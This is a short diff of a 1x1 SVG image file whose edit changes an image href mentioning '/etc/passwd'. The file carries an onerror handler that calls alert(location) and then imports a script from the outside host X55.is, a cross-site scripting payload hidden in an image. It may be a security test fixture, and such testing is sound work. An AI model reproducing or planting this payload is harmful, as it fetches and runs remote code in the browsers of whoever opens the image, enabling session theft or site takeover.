@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
-  <image href="alert(1)/etc/passwd@no-such.png"
+  <image href="alert(1)/etc/passwd"
          width="1" height="1"
          onerror="alert(location);import('https://X55.is?1=2/.source')" />
 </svg>
